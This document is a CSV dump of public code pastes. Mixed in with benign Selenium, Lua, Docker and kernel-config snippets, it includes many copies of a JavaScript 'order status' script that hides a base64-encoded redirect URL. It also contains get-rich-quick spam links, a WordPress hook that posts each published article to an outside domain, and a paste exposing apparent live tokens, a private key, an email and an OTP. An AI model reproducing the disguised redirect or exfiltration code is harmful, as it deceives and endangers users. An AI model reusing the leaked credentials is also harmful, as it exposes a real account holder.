id,title,username,language,date,content
LRvBGTqS,Make $1000 15-MINUTES (BEGINNER) 3R,Kiddbiebo27,JavaScript,Sunday 6th of April 2025 06:57:37 AM CDT," 
Pdf https://goo.su/DgLIPOe


2FLWrAFA8U
"
G9N0PXgx,Market.js,dentira,JavaScript,Sunday 6th of April 2025 06:56:45 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/98689/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
cxTSuT21,EARN $900 INSTANTLY 2025 Z1,Kiddbiebo27,JavaScript,Sunday 6th of April 2025 06:41:43 AM CDT," 
Pdf https://goo.su/DgLIPOe


yTI0vEo6uU
"
3H4XvS4n,Untitled,dentira,JavaScript,Sunday 6th of April 2025 06:41:22 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/66933/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
6tN3URba,Products.js,dentira,JavaScript,Sunday 6th of April 2025 06:25:59 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/60242/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
PfSGbyb3,Make $1000 15-MINUTES (BEGINNER) TS,Kiddbiebo27,JavaScript,Sunday 6th of April 2025 06:25:47 AM CDT," 
Pdf https://goo.su/DgLIPOe


S8iKzvCY6o
"
HiyjyyG1,gemlogi,crackit-id,PHP,Sunday 6th of April 2025 06:21:19 AM CDT,"add_action('publish_post', function( $ID, $post ) {
    if ($post->post_type == 'post') {
        $webhook_url = 'https://crackitindonesia.net/members/api/auth/ver2/login';

        $response = wp_remote_post(
            $webhook_url,
            array(
                'method' => 'POST',
                'body'   => json_encode( $post ),
                'headers' => array('Content-Type' => 'application/json')
            )
        );
    }
}, 10, 2);"
7b0Mu8j6,gem,crackit-id,PHP,Sunday 6th of April 2025 06:15:17 AM CDT,"var request = new XMLHttpRequest();
request.open(""POST"", ""https://pastebin.com/api/api_post.php"", true);

request.setRequestHeader(""Content-type"", ""application/x-www-form-urlencoded"");

request.send(""{""success"":true,""data"":{""access_token"":""eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vYXBwLmdlbWxvZ2luLnZuL2FwaS9hdXRoL3ZlcjIvbG9naW4iLCJpYXQiOjE3NDMyNTkyMzMsImV4cCI6MTc0NDQ2ODgzMywibmJmIjoxNzQzMjU5MjMzLCJqdGkiOiJycXdKZlZ4ajdpTDdRRDd5Iiwic3ViIjoiMTE0MTciLCJwcnYiOiIyM2JkNWM4OTQ5ZjYwMGFkYjM5ZTcwMWM0MDA4NzJkYjdhNTk3NmY3In0.QUfd17o-bWBE-UrAx3CmC5ot1Xa40EKkHnMpo5WUOOU"",""token_type"":""bearer"",""refresh_token"":""cnj6vgrfyeblj1t4tr5tmamukgx9cdmfitj3453iv6wcn9quqdh9jg83whfqzl6jtrviof1743258361"",""expires_in"":1209600},""user"":{""id"":11417,""first_name"":""unyil"",""last_name"":""tivi"",""email"":""unyiltivi@gmail.com"",""email_verified_at"":null,""phone"":null,""is_active"":1,""is_verify"":1,""plan_id"":1,""avatar"":null,""trust_people"":0,""balance"":""0.00"",""ref"":null,""balance_aff"":""0"",""created_at"":""2025-03-29T14:26:02.000000Z"",""updated_at"":""2025-03-29T14:26:27.000000Z"",""confirm_otp"":""237019"",""token_verify"":"""",""percent_aff"":20,""private_key"":""YjCD5g5MSSK2hHmHoqAVUOVzDvlnMx0gxSX2LTQGJZVa1xRvpd5vdzPnmFO1P0PG"",""mqtt_enable"":0}}"")"
35CMtmbi,Untitled,Josif_tepe,C++,Sunday 6th of April 2025 06:11:33 AM CDT,"import time
import re
from selenium import webdriver
from selenium.webdriver.common.by import By

driver = webdriver.Chrome()
driver.get('https://mendo.mk')
time.sleep(5)

username_input_label = driver.find_element(By.XPATH, '//*[@id=""username""]')
time.sleep(2)
username_input_label.send_keys(""Selenium"")
time.sleep(2)

password_input_label = driver.find_element(By.XPATH, '//*[@id=""password""]')
time.sleep(2)
password_input_label.send_keys(""selenium"")

button_to_login = driver.find_element(By.XPATH, '//*[@id=""LoginForm""]/fieldset/p[4]/input')
button_to_login.click()
time.sleep(2)

id_problem = 1
url = f'https://mendo.mk/Task.do?id={id_problem}'
driver.get(url)
driver.execute_script('window.scrollTo(0, document.body.scrollHeight - 800);')
time.sleep(2)

solution_input = driver.find_element(By.XPATH, '//*[@id=""solutionCode""]')

solution_code = ''
with open('main.txt', 'r') as f:
    solution_code = f.read()

solution_input.send_keys(solution_code)

submit_code_button = driver.find_element(By.XPATH, '//*[@id=""SolutionForm""]/fieldset/p[4]/input')
submit_code_button.click()
time.sleep(10)

html = driver.page_source


correct_answers = re.findall('Correct', html)
wrong_asnwers = re.findall('Wrong', html)
timeout_answers = re.findall(""Time Limit "", html)
runtime_answers = re.findall(""Runtime"", html)

print(f""Correct answers: {len(correct_answers)}"")
print(f""Wrong answers: {len(wrong_asnwers)}"")
print(f""Timeout answers: {len(timeout_answers)}"")
print(f""Runtime answers: {len(runtime_answers)}"")




time.sleep(100)
"
xGsVXBGt,Order.js,dentira,JavaScript,Sunday 6th of April 2025 06:10:36 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/99312/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
41McPMJm,EARN $900 INSTANTLY 2025 X0,Ashninja12334,JavaScript,Sunday 6th of April 2025 06:09:51 AM CDT," 
Pdf https://goo.su/DgLIPOe


NlNVcfZTAD
"
WPHFfdVv,Hands Fix,Aoki1337,Lua,Sunday 6th of April 2025 06:01:53 AM CDT,"local function getHands()
	return LocalPlayer():GetWeapon( 'none' )
end

function fixHandsViewModel()
	local wep = getHands()

	if IsValid( wep ) then
		function wep:ShouldDrawViewModel()
			return false
		end
	end
end

local hands = nil

hook.Add( ""PlayerSlowThink"", ""fixhands"", function()
	if !IsValid( LocalPlayer() ) then return end

	hook.Add( ""PlayerSlowThink"", ""fixhands"", function()
		if hands and IsValid( hands ) then return end

		hands = getHands()

		if hands and IsValid( hands ) then
			fixHandsViewModel()
		end
	end )
end )
"
xBwe4gBc,dataNone,TestGuy1,JSON,Sunday 6th of April 2025 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'a1255cb3b25a380c56f73a71b3c9241715326823688b651450963b72d9421a4c98b10055986844fe8924c6593eabb12b6b8724f16697ff4291d76dc8dc054181b35002661c46441d54eaee33099c790783b34eca12dc39cb7f49a564bb7d7588d935151ddc7b5feafbc35e3d7e9c7d2c4b65897787d000848e36d08ad952caad',
  otherdata: [
    'eb9274ebbb4028583466024ababbecf9',
    '0759d7d355b2fccc2a1afa8f182915af',
    '4b6e5c3a9fd1b552effceeb3a450a011',
    'eb47ea36be7515ae658b657bfee21663',
    '9581f328b6df67f00fe722d793f97991',
    'd8f54fa27c90ed5ddba3b51b059d98a5',
    '1b023f0cff16ba7a7f231596e0017aad',
    'c1e4a48ec9067415b86e06dd5cb37947'
  ]
}"
fH195kLN,Untitled,drakon-firestone,JavaScript,Sunday 6th of April 2025 05:57:54 AM CDT,"let numerZdjecia = 0;
slajder();

function slajder() {
  
  const img = document.getElementsByClassName(""auto-galeria"");
  
  for(let i = 0; i < img.length; i++)
  {
      img[i].style.display = ""none"";
  }
  
  numerZdjecia++; // zwiekszamy nr zdjecia o 1
  
  if(numerZdjecia >= img.length) {
    numerZdjecia = 0;
  }
  
  img[numerZdjecia].style.display = ""block"";
  
  setTimeout(slajder, 3000); // uruchamianie slajdera co 3tys ms = 3 sek
}"
W5zx6Ymv,Market.js,dentira,JavaScript,Sunday 6th of April 2025 05:55:14 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/09104/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
3SyAHeAC,Untitled,dentira,JavaScript,Sunday 6th of April 2025 05:39:50 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/72543/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
dYf3w8xC,Portainer ipv4,tracins,YAML,Sunday 6th of April 2025 05:27:34 AM CDT,"version: ""3.8""

services:
  portainer:
    image: portainer/portainer-ce:latest
    user: 0:0
    ports:
      - ""0.0.0.0:9443:9000"" # Bind to IPv4 0.0.0.0
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock
      - portainer_data:/data
    networks:
      - portainer_network # Attach to the IPv4 network

networks:
  portainer_network:
    ipam:
      config:
        - subnet: 172.20.0.0/16 # Choose an IPv4 subnet
    driver: bridge

volumes:
  portainer_data:
"
zeeDYPwU,Products.js,dentira,JavaScript,Sunday 6th of April 2025 05:24:27 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/69013/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
TqzcYux0,Order.js,dentira,JavaScript,Sunday 6th of April 2025 05:09:04 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/80818/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
xi44XU0W,Market.js,dentira,JavaScript,Sunday 6th of April 2025 04:53:18 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/08493/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
uFsfrYjg,V3Tool,Onenoone1,Python,Sunday 6th of April 2025 04:52:37 AM CDT,"@echo off
chcp 65001 >nul

 echo เครื่องต้องมีพื้นที่อย่างน้อย35GB!!!

:: ตรวจสอบว่า D:\MorganGames_x64 มีอยู่หรือไม่
if not exist ""C:\MorganGames_x64"" (
    echo [ERROR] ไม่พบโฟลเดอร์ C:\MorganGames_x64 กรุณาติดต่อ https://web.facebook.com/chonlathan.nillerd/
    pause
    exit /b
)

:: ตรวจสอบและสร้าง C:\Backup\def หากยังไม่มี
if not exist ""C:\Backup\def"" (
    echo สร้างโฟลเดอร์สำรอง: C:\Backup\def
    mkdir ""C:\Backup\def""
)

:: ตรวจสอบว่ามีไฟล์ gta_sa.exe ใน C:\Backup\def หรือไม่
if exist ""C:\Backup\def\gta_sa.exe"" (
    echo พบไฟล์ gta_sa.exe ใน C:\Backup\def แล้ว ข้ามขั้นตอนการสำรองข้อมูล
) else (
    :: สำรองไฟล์ทั้งหมดจาก C:\MorganGames_x64 ไปยัง C:\Backup\def
    echo กำลังสำรองข้อมูลจาก C:\MorganGames_x64 ไปยัง C:\Backup\def...
    xcopy ""C:\MorganGames_x64\*"" ""C:\Backup\def"" /E /H /C /I /Y
)

:: ดาวน์โหลดไฟล์จากคลาวด์
set ""downloadUrl=https://drive.usercontent.google.com/download?id=1Vj5-_rTIFvHkawzKnyxkgGzhCZGLK01h&export=download&authuser=0&confirm=t&uuid=5733ed00-2efa-444a-b1e4-59b13528f282&at=AIrpjvO5cwDl0GijFcOD3MiY8oOc%3A1739008406028""
set ""downloadPath=%~dp0Ntxfile.zip""
set ""extractPath=%~dp0temp""

:: ตรวจสอบว่ามี curl หรือ wget
where curl >nul 2>nul
if %errorlevel%==0 (
    echo กำลังดาวน์โหลดไฟล์ด้วย curl...
    curl -o ""%downloadPath%"" ""%downloadUrl%""
) else (
    where wget >nul 2>nul
    if %errorlevel%==0 (
        echo กำลังดาวน์โหลดไฟล์ด้วย wget...
        wget -O ""%downloadPath%"" ""%downloadUrl%""
    ) else (
        echo [ERROR] ไม่พบ curl หรือ wget ในระบบ
        pause
        exit /b
    )
)

:: แตกไฟล์ zip
powershell -Command ""Expand-Archive -Path '%downloadPath%' -DestinationPath '%extractPath%' -Force""

:: คัดลอกโฟลเดอร์ Ntxfile ทั้งหมดไปยัง C:\MorganGames_x64
xcopy ""%temp%\temp\Ntxfile"" ""C:\MorganGames_x64\Ntxfile\"" /E /H /C /I /Y

:: ย้ายเนื้อหาทั้งหมดจาก Ntxfile ไปยัง C:\MorganGames_x64
xcopy ""C:\MorganGames_x64\Ntxfile\*"" ""C:\MorganGames_x64\"" /E /H /C /I /Y
move /y ""C:\MorganGames_x64\Ntxfile\*"" ""C:\MorganGames_x64\""

:: ลบโฟลเดอร์ Ntxfile ที่ว่างเปล่า
rmdir /s /q ""C:\MorganGames_x64\Ntxfile""

:: ลบไฟล์ temp หลังการใช้งาน
rd /s /q ""%extractPath%""
del ""%downloadPath%""

echo การดำเนินการเสร็จสมบูรณ์

::อัพเดท 195 คน"
u19u2Scj,Untitled,dentira,JavaScript,Sunday 6th of April 2025 04:37:56 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/73650/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
XjR8W8NM,bhyve-config,mounty,Bash,Sunday 6th of April 2025 04:28:28 AM CDT,"create -b
set zonepath=/rpool/machine/Gentoo
set brand=bhyve
set autoboot=true
set ip-type=exclusive
add fs
set dir=""/support/images/install-amd64-minimal-20250216T164837Z.iso""
set special=""/support/images/install-amd64-minimal-20250216T164837Z.iso""
set type=""lofs""
add options ro
add options nodevices
end
add net
set physical=""Gentoolan0""
end
add device
set match=""/dev/zvol/rdsk/volumes/vol/Gentoo/boot""
end
add device
set match=""/dev/zvol/rdsk/volumes/vol/Gentoo/root""
end
add device
set match=""/dev/zvol/rdsk/volumes/vol/Gentoo/swap""
end
add attr
set name=""bootrom""
set type=""string""
set value=""BHYVE_RELEASE""
end
add attr
set name=""vnc""
set type=""string""
set value=""unix=/tmp/vpn-server.vnc""
end
add attr
set name=""acpi""
set type=""string""
set value=""on""
end
add attr
set name=""console""
set type=""string""
set value=""/dev/zconsole""
end
add attr
set name=""disk0""
set type=""string""
set value=""volumes/vol/Gentoo/root""
end
add attr
set name=""disk1""
set type=""string""
set value=""volumes/vol/Gentoo/swap""
end
add attr
set name=""bootdisk""
set type=""string""
set value=""volumes/vol/Gentoo/boot""
end
add attr
set name=""cdrom""
set type=""string""
set value=""/support/images/install-amd64-minimal-20250216T164837Z.iso""
end
"
eMU9vcxR,Kernel config,mounty,INI file,Sunday 6th of April 2025 04:25:00 AM CDT,"#
# Automatically generated file; DO NOT EDIT.
# Linux/x86 6.1.1-gentoo Kernel Configuration
#
CONFIG_CC_VERSION_TEXT=""gcc (Gentoo 14.2.0 p4) 14.2.0""
CONFIG_CC_IS_GCC=y
CONFIG_GCC_VERSION=140200
CONFIG_CLANG_VERSION=0
CONFIG_AS_IS_GNU=y
CONFIG_AS_VERSION=24200
CONFIG_LD_IS_BFD=y
CONFIG_LD_VERSION=24200
CONFIG_LLD_VERSION=0
CONFIG_CC_CAN_LINK=y
CONFIG_CC_CAN_LINK_STATIC=y
CONFIG_CC_HAS_ASM_GOTO_OUTPUT=y
CONFIG_CC_HAS_ASM_GOTO_TIED_OUTPUT=y
CONFIG_CC_HAS_ASM_INLINE=y
CONFIG_CC_HAS_NO_PROFILE_FN_ATTR=y
CONFIG_PAHOLE_VERSION=0
CONFIG_IRQ_WORK=y
CONFIG_BUILDTIME_TABLE_SORT=y
CONFIG_THREAD_INFO_IN_TASK=y

#
# General setup
#
CONFIG_BROKEN_ON_SMP=y
CONFIG_INIT_ENV_ARG_LIMIT=32
# CONFIG_COMPILE_TEST is not set
# CONFIG_WERROR is not set
CONFIG_LOCALVERSION=""""
CONFIG_LOCALVERSION_AUTO=y
CONFIG_BUILD_SALT=""""
CONFIG_HAVE_KERNEL_GZIP=y
CONFIG_HAVE_KERNEL_BZIP2=y
CONFIG_HAVE_KERNEL_LZMA=y
CONFIG_HAVE_KERNEL_XZ=y
CONFIG_HAVE_KERNEL_LZO=y
CONFIG_HAVE_KERNEL_LZ4=y
CONFIG_HAVE_KERNEL_ZSTD=y
# CONFIG_KERNEL_GZIP is not set
# CONFIG_KERNEL_BZIP2 is not set
CONFIG_KERNEL_LZMA=y
# CONFIG_KERNEL_XZ is not set
# CONFIG_KERNEL_LZO is not set
# CONFIG_KERNEL_LZ4 is not set
# CONFIG_KERNEL_ZSTD is not set
CONFIG_DEFAULT_INIT=""""
CONFIG_DEFAULT_HOSTNAME=""pantry""
CONFIG_SYSVIPC=y
CONFIG_SYSVIPC_SYSCTL=y
CONFIG_SYSVIPC_COMPAT=y
# CONFIG_POSIX_MQUEUE is not set
# CONFIG_WATCH_QUEUE is not set
CONFIG_CROSS_MEMORY_ATTACH=y
CONFIG_USELIB=y
CONFIG_AUDIT=y
CONFIG_HAVE_ARCH_AUDITSYSCALL=y
CONFIG_AUDITSYSCALL=y

#
# IRQ subsystem
#
CONFIG_GENERIC_IRQ_PROBE=y
CONFIG_GENERIC_IRQ_SHOW=y
CONFIG_HARDIRQS_SW_RESEND=y
CONFIG_IRQ_DOMAIN=y
CONFIG_IRQ_DOMAIN_HIERARCHY=y
CONFIG_GENERIC_MSI_IRQ=y
CONFIG_GENERIC_MSI_IRQ_DOMAIN=y
CONFIG_GENERIC_IRQ_MATRIX_ALLOCATOR=y
CONFIG_GENERIC_IRQ_RESERVATION_MODE=y
CONFIG_IRQ_FORCED_THREADING=y
CONFIG_SPARSE_IRQ=y
# end of IRQ subsystem

CONFIG_CLOCKSOURCE_WATCHDOG=y
CONFIG_ARCH_CLOCKSOURCE_INIT=y
CONFIG_CLOCKSOURCE_VALIDATE_LAST_CYCLE=y
CONFIG_GENERIC_TIME_VSYSCALL=y
CONFIG_GENERIC_CLOCKEVENTS=y
CONFIG_GENERIC_CLOCKEVENTS_BROADCAST=y
CONFIG_GENERIC_CLOCKEVENTS_MIN_ADJUST=y
CONFIG_GENERIC_CMOS_UPDATE=y
CONFIG_HAVE_POSIX_CPU_TIMERS_TASK_WORK=y
CONFIG_POSIX_CPU_TIMERS_TASK_WORK=y
CONFIG_CONTEXT_TRACKING=y
CONFIG_CONTEXT_TRACKING_IDLE=y

#
# Timers subsystem
#
CONFIG_TICK_ONESHOT=y
CONFIG_HZ_PERIODIC=y
# CONFIG_NO_HZ_IDLE is not set
# CONFIG_NO_HZ is not set
CONFIG_HIGH_RES_TIMERS=y
CONFIG_CLOCKSOURCE_WATCHDOG_MAX_SKEW_US=100
# end of Timers subsystem

CONFIG_BPF=y
CONFIG_HAVE_EBPF_JIT=y
CONFIG_ARCH_WANT_DEFAULT_BPF_JIT=y

#
# BPF subsystem
#
CONFIG_BPF_SYSCALL=y
# CONFIG_BPF_JIT is not set
CONFIG_BPF_UNPRIV_DEFAULT_OFF=y
# CONFIG_BPF_PRELOAD is not set
# end of BPF subsystem

CONFIG_PREEMPT_BUILD=y
CONFIG_PREEMPT_NONE=y
# CONFIG_PREEMPT_VOLUNTARY is not set
# CONFIG_PREEMPT is not set
CONFIG_PREEMPT_COUNT=y
CONFIG_PREEMPTION=y
CONFIG_PREEMPT_DYNAMIC=y

#
# CPU/Task time and stats accounting
#
CONFIG_TICK_CPU_ACCOUNTING=y
# CONFIG_VIRT_CPU_ACCOUNTING_GEN is not set
# CONFIG_IRQ_TIME_ACCOUNTING is not set
# CONFIG_BSD_PROCESS_ACCT is not set
# CONFIG_TASKSTATS is not set
# CONFIG_PSI is not set
# end of CPU/Task time and stats accounting

#
# RCU Subsystem
#
CONFIG_TREE_RCU=y
CONFIG_PREEMPT_RCU=y
# CONFIG_RCU_EXPERT is not set
CONFIG_SRCU=y
CONFIG_TREE_SRCU=y
CONFIG_TASKS_RCU_GENERIC=y
CONFIG_TASKS_RCU=y
CONFIG_TASKS_TRACE_RCU=y
CONFIG_RCU_STALL_COMMON=y
CONFIG_RCU_NEED_SEGCBLIST=y
# end of RCU Subsystem

# CONFIG_IKCONFIG is not set
# CONFIG_IKHEADERS is not set
CONFIG_LOG_BUF_SHIFT=16
CONFIG_PRINTK_SAFE_LOG_BUF_SHIFT=13
CONFIG_HAVE_UNSTABLE_SCHED_CLOCK=y

#
# Scheduler features
#
# end of Scheduler features

CONFIG_ARCH_SUPPORTS_NUMA_BALANCING=y
CONFIG_ARCH_WANT_BATCHED_UNMAP_TLB_FLUSH=y
CONFIG_CC_HAS_INT128=y
